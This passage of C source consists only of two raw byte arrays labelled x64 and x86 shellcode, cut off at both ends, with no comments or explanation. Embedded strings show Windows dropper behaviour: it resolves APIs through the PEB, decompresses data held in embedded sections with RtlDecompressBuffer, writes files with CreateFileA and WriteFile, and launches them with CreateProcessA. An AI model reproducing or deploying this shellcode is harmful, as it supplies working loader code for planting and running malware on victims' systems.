0xB9, 0x02, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xD5, 0xE8, 0xE4, 0xFA, 0xFF, 0xFF, 0x45, 0x31, 0xC9, 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x8B, 0x90, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x88, 0xB0, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x04, 0x00, 0x00, 0x00, 0x89, 0x54, 0x24, 0x64, 0xBA, 0x00, 0x00, 0x00, 0x10, 0xFF, 0xD6, 0x8B, 0x53, 0x0C, 0x4D, 0x89, 0xE1, 0x49, 0x89, 0xC7, 0x44, 0x8B, 0x44, 0x24, 0x64, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0x48, 0x03, 0x50, 0x10, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x68, 0xFF, 0xD0, 0x4C, 0x89, 0xF9, 0x4C, 0x8B, 0x7C, 0x24, 0x58, 0x41, 0xFF, 0xD7, 0x41, 0x8B, 0x4E, 0x0C, 0x44, 0x8B, 0x43, 0x08, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x8B, 0x53, 0x0C, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x28, 0x45, 0x8B, 0x4E, 0x08, 0x48, 0x01, 0xC2, 0x44, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x8D, 0x0C, 0x01, 0xB9, 0x02, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xD5, 0xE8, 0x37, 0xFA, 0xFF, 0xFF, 0x45, 0x31, 0xC9, 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x10, 0x8B, 0x78, 0x7C, 0x48, 0x8D, 0x88, 0x84, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xD6, 0x8B, 0x53, 0x0C, 0x48, 0x8D, 0x9C, 0x24, 0x10, 0x01, 0x00, 0x00, 0x4D, 0x89, 0xE1, 0x48, 0x89, 0xC6, 0x41, 0x89, 0xF8, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x03, 0x50, 0x10, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x68, 0xFF, 0xD0, 0x48, 0x89, 0xF1, 0x41, 0xFF, 0xD7, 0x48, 0x8D, 0xB4, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xE8, 0x49, 0xF5, 0xFF, 0xFF, 0xB8, 0x05, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x4C, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x50, 0x01, 0x00, 0x00, 0xE8, 0x92, 0xF9, 0xFF, 0xFF, 0x45, 0x31, 0xC9, 0x45, 0x31, 0xC0, 0x48, 0x8B, 0x7C, 0x24, 0x50, 0x48, 0x8D, 0x90, 0xB0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x74, 0x24, 0x48, 0x31, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x89, 0xD9, 0xE8, 0xD7, 0xF4, 0xFF, 0xFF, 0xBA, 0x05, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0x50, 0x01, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x4C, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x20, 0xF9, 0xFF, 0xFF, 0x48, 0x89, 0x74, 0x24, 0x48, 0x45, 0x31, 0xC9, 0x45, 0x31, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x48, 0x8D, 0x90, 0x84, 0x00, 0x00, 0x00, 0x31, 0xC9, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x8D, 0x65, 0xC8, 0x5B, 0x5E, 0x5F, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
unsigned int x64_shellcode_size = 3344;

unsigned char x86_shellcode[] = { 0xE9, 0x2B, 0x06, 0x00, 0x00, 0x90, 0x8D, 0x41, 0x10, 0x39, 0xC2, 0x73, 0x0B, 0x8D, 0x42, 0x10, 0x39, 0xC1, 0x0F, 0x82, 0xBC, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x8D, 0xB6, 0x00, 0x00, 0x00, 0x00, 0xF3, 0x0F, 0x6F, 0x04, 0x02, 0x0F, 0x11, 0x04, 0x01, 0x83, 0xC0, 0x10, 0x3D, 0x20, 0x01, 0x00, 0x00, 0x75, 0xED, 0x0F, 0xB6, 0x82, 0x20, 0x01, 0x00, 0x00, 0x88, 0x81, 0x20, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x21, 0x01, 0x00, 0x00, 0x88, 0x81, 0x21, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x22, 0x01, 0x00, 0x00, 0x88, 0x81, 0x22, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x23, 0x01, 0x00, 0x00, 0x88, 0x81, 0x23, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x24, 0x01, 0x00, 0x00, 0x88, 0x81, 0x24, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x25, 0x01, 0x00, 0x00, 0x88, 0x81, 0x25, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x26, 0x01, 0x00, 0x00, 0x88, 0x81, 0x26, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x27, 0x01, 0x00, 0x00, 0x88, 0x81, 0x27, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x28, 0x01, 0x00, 0x00, 0x88, 0x81, 0x28, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x29, 0x01, 0x00, 0x00, 0x88, 0x81, 0x29, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x2A, 0x01, 0x00, 0x00, 0x88, 0x81, 0x2A, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x2B, 0x01, 0x00, 0x00, 0x88, 0x81, 0x2B, 0x01, 0x00, 0x00, 0x31, 0xC0, 0xC2, 0x04, 0x00, 0x55, 0x31, 0xC0, 0x89, 0xE5, 0x53, 0x8D, 0xB6, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x1C, 0x02, 0x88, 0x1C, 0x01, 0x83, 0xC0, 0x01, 0x3D, 0x2C, 0x01, 0x00, 0x00, 0x75, 0xEF, 0x31, 0xC0, 0x5B, 0x5D, 0xC2, 0x04, 0x00, 0x56, 0x53, 0x80, 0x39, 0x00, 0x74, 0x4E, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x80, 0x3C, 0x01, 0x00, 0x74, 0x0A, 0x83, 0xC0, 0x01, 0x3D, 0x2C, 0x01, 0x00, 0x00, 0x75, 0xF0, 0x0F, 0xB6, 0x32, 0x89, 0xF3, 0x84, 0xDB, 0x74, 0x29, 0x8D, 0x1C, 0x01, 0x89, 0xF0, 0x88, 0x03, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x0C, 0x02, 0x84, 0xC9, 0x74, 0x0E, 0x83, 0xC0, 0x01, 0x88, 0x4C, 0x03, 0xFF, 0x3D, 0x2C, 0x01, 0x00, 0x00, 0x75, 0xEA, 0x31, 0xC0, 0x5B, 0x5E, 0xC2, 0x04, 0x00, 0x31, 0xC0, 0xEB, 0xC3, 0x89, 0xCA, 0x57, 0x31, 0xC0, 0xB9, 0x11, 0x00, 0x00, 0x00, 0x89, 0xD7, 0xF3, 0xAB, 0x5F, 0xC2, 0x04, 0x00, 0x66, 0x83, 0x39, 0x00, 0x74, 0x27, 0x53, 0x8D, 0x59, 0x02, 0x31, 0xC0, 0x90, 0x0F, 0xB7, 0x0B, 0x83, 0xC3, 0x02, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xB7, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x66, 0x85, 0xC9, 0x75, 0xE8, 0x5B, 0xC3, 0x8D, 0xB6, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC0, 0xC3, 0x80, 0x39, 0x00, 0x74, 0x28, 0x53, 0x8D, 0x59, 0x01, 0x31, 0xC0, 0x66, 0x90, 0x0F, 0xB6, 0x0B, 0x83, 0xC3, 0x01, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xBE, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x84, 0xC9, 0x75, 0xE9, 0x5B, 0xC3, 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC0, 0xC3, 0x57, 0x56, 0x53, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x58, 0x14, 0x8D, 0x70, 0x14, 0x39, 0xF3, 0x74, 0x27, 0x89, 0xCF, 0xEB, 0x09, 0x8D, 0x76, 0x00, 0x8B, 0x1B, 0x39, 0xF3, 0x74, 0x1A, 0x8B, 0x4B, 0x28, 0xE8, 0x75, 0xFF, 0xFF, 0xFF, 0x39, 0xF8, 0x75, 0xEE, 0x8B, 0x43, 0x10, 0x5B, 0x5E, 0x5F, 0xC3, 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x31, 0xC0, 0x5E, 0x5F, 0xC3, 0x8B, 0x41, 0x3C, 0x8B, 0x44, 0x01, 0x78, 0x85, 0xC0, 0x74, 0x6F, 0x55, 0x01, 0xC8, 0x57, 0x56, 0x53, 0x83, 0xEC, 0x08, 0x8B, 0x78, 0x18, 0x89, 0x44, 0x24, 0x04, 0x85, 0xFF, 0x74, 0x28, 0x8B, 0x58, 0x20, 0x89, 0x14, 0x24, 0x89, 0xCE, 0x31, 0xED, 0x01, 0xCB, 0x85, 0xDB, 0x74, 0x0E, 0x8B, 0x0B, 0x01, 0xF1, 0xE8, 0x55, 0xFF, 0xFF, 0xFF, 0x3B, 0x04, 0x24, 0x74, 0x1D, 0x83, 0xC5, 0x01, 0x83, 0xC3, 0x04, 0x39, 0xEF, 0x75, 0xE4, 0x83, 0xC4, 0x08, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x89, 0xF6, 0x8D, 0xBC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x7C, 0x24, 0x04, 0x8D, 0x04, 0x6E, 0x03, 0x47, 0x24, 0x0F, 0xB7, 0x00, 0x8D, 0x04, 0x86, 0x03, 0x47, 0x1C, 0x03, 0x30, 0x83, 0xC4, 0x08, 0x5B, 0x89, 0xF0, 0x5E, 0x5F, 0x5D, 0xC3, 0x90, 0x31, 0xC0, 0xC3, 0x0F, 0xB6, 0x01, 0x56, 0x89, 0xD6, 0x53, 0x0F, 0xB6, 0x12, 0x84, 0xC0, 0x74, 0x22, 0x38, 0xC2, 0x75, 0x2B, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x0B, 0x8D, 0x74, 0x26, 0x00, 0x83, 0xC0, 0x01, 0x38, 0xD3, 0x75, 0x19, 0x0F, 0xB6, 0x1C, 0x01, 0x0F, 0xB6, 0x14, 0x06, 0x84, 0xDB, 0x75, 0xED, 0x84, 0xD2, 0x5B, 0x0F, 0x94, 0xC0, 0x5E, 0xC3, 0x90, 0x8D, 0x74, 0x26, 0x00, 0x31, 0xC0, 0x5B, 0x5E, 0xC3, 0x83, 0xEC, 0x1C, 0x8B, 0x44, 0x24, 0x20, 0x85, 0xC0, 0x74, 0x13, 0x0F, 0xBE, 0xD2, 0x89, 0x44, 0x24, 0x08, 0x89, 0x54, 0x24, 0x04, 0x89, 0x0C, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x83, 0xC4, 0x1C, 0xC2, 0x04, 0x00, 0x55, 0x89, 0xE5, 0x57, 0x56, 0x53, 0x83, 0xE4, 0xF0, 0x83, 0xEC, 0x10, 0x8B, 0x5D, 0x08, 0x89, 0x4C, 0x24, 0x0C, 0x85, 0xDB, 0x0F, 0x84, 0x5C, 0x01, 0x00, 0x00, 0x8D, 0x41, 0x10, 0x89, 0xCF, 0x39, 0xC2, 0x0F, 0x93, 0xC0, 0x89, 0xC6, 0x8D, 0x42, 0x10, 0x39, 0xC1, 0x89, 0xF1, 0x0F, 0x93, 0xC0, 0x08, 0xC1, 0x0F, 0x84, 0x4C, 0x01, 0x00, 0x00, 0x8D, 0x43, 0xFF, 0x83, 0xF8, 0x0E, 0x0F, 0x86, 0x40, 0x01, 0x00, 0x00, 0x89, 0xFE, 0x89, 0xDF, 0x89, 0xD0, 0x83, 0xE7, 0xF0, 0x01, 0xD7, 0x90, 0x8D, 0x74, 0x26, 0x00, 0xF3, 0x0F, 0x6F, 0x00, 0x83, 0xC0, 0x10, 0x83, 0xC6, 0x10, 0x0F, 0x11, 0x46, 0xF0, 0x39, 0xF8, 0x75, 0xEE, 0x89, 0xD8, 0x83, 0xE0, 0xF0, 0x39, 0xC3, 0x0F, 0x84, 0x03, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x0C, 0x02, 0x8D, 0x70, 0x01, 0x8B, 0x7C, 0x24, 0x0C, 0x88, 0x0C, 0x07, 0x39, 0xF3, 0x0F, 0x86, 0xED, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x4C, 0x02, 0x01, 0x8D, 0x70, 0x02, 0x88, 0x4C, 0x07, 0x01, 0x39, 0xF3, 0x0F, 0x86, 0xD9, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x4C, 0x02, 0x02, 0x8D, 0x70, 0x03, 0x88, 0x4C, 0x07, 0x02, 0x39, 0xF3, 0x0F, 0x86, 0xC5, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x4C, 0x02, 0x03, 0x8D, 0x70, 0x04, 0x88, 0x4C, 0x07, 0x03, 0x39, 0xF3, 0x0F, 0x86, 0xB1, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x4C, 0x02, 0x04, 0x8D, 0x70, 0x05, 0x88, 0x4C, 0x07, 0x04, 0x39, 0xF3, 0x0F, 0x86, 0x9D, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x4C, 0x02, 0x05, 0x8D, 0x70, 0x06, 0x88, 0x4C, 0x07, 0x05, 0x39, 0xF3, 0x0F, 0x86, 0x89, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x4C, 0x02, 0x06, 0x8D, 0x70, 0x07, 0x88, 0x4C, 0x07, 0x06, 0x39, 0xF3, 0x76, 0x79, 0x0F, 0xB6, 0x4C, 0x02, 0x07, 0x8D, 0x70, 0x08, 0x88, 0x4C, 0x07, 0x07, 0x39, 0xF3, 0x76, 0x69, 0x0F, 0xB6, 0x4C, 0x02, 0x08, 0x8D, 0x70, 0x09, 0x88, 0x4C, 0x07, 0x08, 0x39, 0xF3, 0x76, 0x59, 0x0F, 0xB6, 0x4C, 0x02, 0x09, 0x8D, 0x70, 0x0A, 0x88, 0x4C, 0x07, 0x09, 0x39, 0xF3, 0x76, 0x49, 0x0F, 0xB6, 0x4C, 0x02, 0x0A, 0x8D, 0x70, 0x0B, 0x88, 0x4C, 0x07, 0x0A, 0x39, 0xF3, 0x76, 0x39, 0x0F, 0xB6, 0x4C, 0x02, 0x0B, 0x8D, 0x70, 0x0C, 0x88, 0x4C, 0x07, 0x0B, 0x39, 0xF3, 0x76, 0x29, 0x0F, 0xB6, 0x4C, 0x02, 0x0C, 0x8D, 0x70, 0x0D, 0x88, 0x4C, 0x07, 0x0C, 0x39, 0xF3, 0x76, 0x19, 0x0F, 0xB6, 0x4C, 0x02, 0x0D, 0x8D, 0x70, 0x0E, 0x88, 0x4C, 0x07, 0x0D, 0x39, 0xF3, 0x76, 0x09, 0x0F, 0xB6, 0x54, 0x02, 0x0E, 0x88, 0x54, 0x07, 0x0E, 0x8D, 0x65, 0xF4, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0x5D, 0xC2, 0x04, 0x00, 0x66, 0x90, 0x8B, 0x4C, 0x24, 0x0C, 0x01, 0xD3, 0x8D, 0x76, 0x00, 0x8D, 0xBC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x02, 0x83, 0xC2, 0x01, 0x83, 0xC1, 0x01, 0x88, 0x41, 0xFF, 0x39, 0xDA, 0x75, 0xF0, 0x8D, 0x65, 0xF4, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0x5D, 0xC2, 0x04, 0x00, 0x56, 0x53, 0x8B, 0x74, 0x24, 0x0C, 0x85, 0xF6, 0x74, 0x3D, 0x80, 0x39, 0x00, 0x74, 0x3F, 0x89, 0xF3, 0x31, 0xC0, 0xEB, 0x06, 0x80, 0x3C, 0x01, 0x00, 0x74, 0x09, 0x83, 0xC0, 0x01, 0x39, 0xF0, 0x75, 0xF3, 0x89, 0xD8, 0x0F, 0xB6, 0x1A, 0x84, 0xDB, 0x74, 0x1C, 0x01, 0xC1, 0x8D, 0x42, 0x01, 0x01, 0xF2, 0xEB, 0x0D, 0x0F, 0xB6, 0x18, 0x83, 0xC1, 0x01, 0x83, 0xC0, 0x01, 0x84, 0xDB, 0x74, 0x06, 0x88, 0x19, 0x39, 0xD0, 0x75, 0xED, 0x31, 0xC0, 0x5B, 0x5E, 0xC2, 0x04, 0x00, 0x31, 0xDB, 0xEB, 0xD0, 0x57, 0x56, 0x53, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x08, 0x8B, 0x50, 0x3C, 0x66, 0x83, 0x7C, 0x02, 0x06, 0x00, 0x8D, 0x9C, 0x10, 0xF8, 0x00, 0x00, 0x00, 0x74, 0x34, 0x89, 0xCF, 0x31, 0xF6, 0xEB, 0x1B, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x08, 0x83, 0xC6, 0x01, 0x83, 0xC3, 0x28, 0x8B, 0x50, 0x3C, 0x0F, 0xB7, 0x44, 0x02, 0x06, 0x39, 0xF0, 0x76, 0x13, 0x89, 0xFA, 0x89, 0xD9, 0xE8, 0x4D, 0xFD, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0xD8, 0x89, 0xD8, 0x5B, 0x5E, 0x5F, 0xC3, 0x31, 0xDB, 0x89, 0xD8, 0x5B, 0x5E, 0x5F, 0xC3, 0x83, 0xEC, 0x10, 0xB8, 0x61, 0x00, 0x00, 0x00, 0x8D, 0x4C, 0x24, 0x0A, 0xC7, 0x44, 0x24, 0x0A, 0x2E, 0x64, 0x61, 0x74, 0x66, 0x89, 0x44, 0x24, 0x0E, 0xE8, 0x88, 0xFF, 0xFF, 0xFF, 0x8B, 0x40, 0x0C, 0x64, 0x8B, 0x15, 0x30, 0x00, 0x00, 0x00, 0x03, 0x42, 0x08, 0x83, 0xC4, 0x10, 0xC3, 0x55, 0x57, 0x56, 0x53, 0x83, 0xEC, 0x08, 0x8B, 0x41, 0x3C, 0x8B, 0x7C, 0x01, 0x78, 0x31, 0xC0, 0x01, 0xCF, 0x8B, 0x5F, 0x20, 0x89, 0x7C, 0x24, 0x04, 0x85, 0xDB, 0x74, 0x4D, 0x8B, 0x6F, 0x18, 0x01, 0xCB, 0x85, 0xED, 0x74, 0x44, 0x89, 0x14, 0x24, 0x89, 0xCF, 0x31, 0xF6, 0xEB, 0x14, 0x8D, 0x76, 0x00, 0x8D, 0xBC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x83, 0xC6, 0x01, 0x83, 0xC3, 0x04, 0x39, 0xEE, 0x74, 0x36, 0x8B, 0x13, 0x8B, 0x0C, 0x24, 0x01, 0xFA, 0xE8, 0xBD, 0xFC, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0xE6, 0x8B, 0x4C, 0x24, 0x04, 0x8D, 0x04, 0x77, 0x03, 0x41, 0x24, 0x0F, 0xB7, 0x00, 0x8D, 0x04, 0x87, 0x03, 0x41, 0x1C, 0x03, 0x38, 0x89, 0xF8, 0x83, 0xC4, 0x08, 0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00, 0x83, 0xC4, 0x08, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x57, 0x56, 0x53, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x58, 0x14, 0x8D, 0x70, 0x14, 0x39, 0xF3, 0x74, 0x1C, 0x89, 0xCF, 0xEB, 0x06, 0x8B, 0x1B, 0x39, 0xF3, 0x74, 0x0E, 0x8B, 0x4B, 0x10, 0x89, 0xFA, 0xE8, 0x53, 0xFF, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEC, 0x5B, 0x5E, 0x5F, 0xC3, 0x31, 0xC0, 0xEB, 0xF8, 0x55, 0xBD, 0x61, 0x32, 0x00, 0x00, 0x57, 0xBF, 0x61, 0x31, 0x00, 0x00, 0x56, 0x53, 0x81, 0xEC, 0x4C, 0x02, 0x00, 0x00, 0x8D, 0x4C, 0x24, 0x60, 0x66, 0x89, 0x7C, 0x24, 0x64, 0xC7, 0x44, 0x24, 0x60, 0x2E, 0x64, 0x61, 0x74, 0xC6, 0x44, 0x24, 0x66, 0x00, 0xE8, 0x8F, 0xFE, 0xFF, 0xFF, 0x8D, 0x4C, 0x24, 0x67, 0x66, 0x89, 0x6C, 0x24, 0x6B, 0x89, 0x44, 0x24, 0x44, 0xC7, 0x44, 0x24, 0x67, 0x2E, 0x64, 0x61, 0x74, 0xC6, 0x44, 0x24, 0x6D, 0x00, 0xE8, 0x70, 0xFE, 0xFF, 0xFF, 0x8D, 0x8C, 0x24, 0xBC, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x48, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xBC, 0x00, 0x00, 0x00, 0x52, 0x74, 0x6C, 0x44, 0x8B, 0x40, 0x08, 0xC7, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x65, 0x63, 0x6F, 0x6D, 0xC7, 0x84, 0x24, 0xC4, 0x00, 0x00, 0x00, 0x70, 0x72, 0x65, 0x73, 0xC7, 0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x73, 0x42, 0x75, 0x66, 0xC7, 0x84, 0x24, 0xCC, 0x00, 0x00, 0x00, 0x66, 0x65, 0x72, 0x00, 0x8B, 0x50, 0x3C, 0x8D, 0x9C, 0x10, 0xF8, 0x00, 0x00, 0x00, 0xE8, 0x22, 0xFF, 0xFF, 0xFF, 0x8D, 0x4C, 0x24, 0x78, 0xC7, 0x44, 0x24, 0x78, 0x43, 0x72, 0x65, 0x61, 0x89, 0x44, 0x24, 0x34, 0xC7, 0x44, 0x24, 0x7C, 0x74, 0x65, 0x46, 0x69, 0xC7, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x6C, 0x65, 0x41, 0x00, 0xE8, 0x93, 0xFA, 0xFF, 0xFF, 0x89, 0xC5, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 0x8D, 0x78, 0x14, 0x39, 0xF7, 0x75, 0x11, 0xEB, 0x29, 0x89, 0xF6, 0x8D, 0xBC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x36, 0x39, 0xF7, 0x74, 0x1A, 0x8B, 0x4E, 0x10, 0x89, 0xEA, 0xE8, 0xD6, 0xFA, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEC, 0x89, 0x44, 0x24, 0x38, 0xEB, 0x0E, 0x8D, 0xB6, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x65, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x6E, 0x57, 0x72, 0x69, 0x74, 0x8D, 0x4C, 0x24, 0x6E, 0x66, 0x89, 0x74, 0x24, 0x76, 0xC7, 0x44, 0x24, 0x72, 0x65, 0x46, 0x69, 0x6C, 0xE8, 0x28, 0xFA, 0xFF, 0xFF, 0x89, 0xC5, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 0x8D, 0x78, 0x14, 0x39, 0xF7, 0x75, 0x08, 0xEB, 0x1E, 0x8B, 0x36, 0x39, 0xF7, 0x74, 0x18, 0x8B, 0x4E, 0x10, 0x89, 0xEA, 0xE8, 0x74, 0xFA, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEC, 0x89, 0x44, 0x24, 0x3C, 0xEB, 0x0C, 0x8D, 0x74, 0x26, 0x00, 0xC7, 0x44, 0x24, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x8C, 0x24, 0x84, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0x43, 0x6C, 0x6F, 0x73, 0xC7, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x65, 0x48, 0x61, 0x6E, 0xC7, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x64, 0x6C, 0x65, 0x00, 0xE8, 0xBE, 0xF9, 0xFF, 0xFF, 0x89, 0xC5, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 0x8D, 0x78, 0x14, 0x39, 0xF7, 0x75, 0x0C, 0xEB, 0x24, 0x8D, 0x74, 0x26, 0x00, 0x8B, 0x36, 0x39, 0xF7, 0x74, 0x1A, 0x8B, 0x4E, 0x10, 0x89, 0xEA, 0xE8, 0x06, 0xFA, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEC, 0x89, 0x44, 0x24, 0x40, 0xEB, 0x0E, 0x8D, 0xB6, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x73, 0x41, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x9D, 0x00, 0x00, 0x00, 0x43, 0x72, 0x65, 0x61, 0x66, 0x89, 0x8C, 0x24, 0xA9, 0x00, 0x00, 0x00, 0x8D, 0x8C, 0x24, 0x9D, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x74, 0x65, 0x50, 0x72, 0xC7, 0x84, 0x24, 0xA5, 0x00, 0x00, 0x00, 0x6F, 0x63, 0x65, 0x73, 0xC6, 0x84, 0x24, 0xAB, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x39, 0xF9, 0xFF, 0xFF, 0x89, 0xC5, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 0x8D, 0x78, 0x14, 0x39, 0xF7, 0x75, 0x08, 0xEB, 0x1F, 0x8B, 0x36, 0x39, 0xF7, 0x74, 0x19, 0x8B, 0x4E, 0x10, 0x89, 0xEA, 0xE8, 0x85, 0xF9, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEC, 0x89, 0x44, 0x24, 0x4C, 0xEB, 0x0D, 0x90, 0x8D, 0x74, 0x26, 0x00, 0xC7, 0x44, 0x24, 0x4C, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x47, 0x65, 0x74, 0x54, 0xC7, 0x84, 0x24, 0x94, 0x00, 0x00, 0x00, 0x65, 